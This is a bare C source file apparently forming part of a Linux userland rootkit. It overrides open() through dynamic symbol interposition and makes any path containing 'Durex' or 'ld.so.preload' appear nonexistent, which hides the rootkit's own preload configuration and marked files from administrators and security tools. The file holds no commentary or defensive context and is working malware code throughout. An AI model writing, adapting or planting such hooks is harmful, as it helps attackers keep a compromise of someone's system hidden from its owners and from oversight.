#define _GNU_SOURCE
#include<stdio.h>
#include<dlfcn.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<errno.h>
#include<string.h>
static const char*filter[]={"Durex","ld.so.preload",0};
#define DECLARE_OPEN static int(*original_##open)(const char*,int,mode_t)=NULL;int open(const char*p,int f,mode_t m){if(!original_##open){original_##open=dlsym(RTLD_NEXT,"__open");if(!original_##open){fprintf(stderr,"Error in dlsym: %s\n",dlerror());errno=ENOENT;return -1;}}int i=0;while(filter[i]){if(strstr(p,filter[i])){errno=ENOENT;return -1;}i++;}return original_##open(p,f,m);}
DECLARE_OPEN
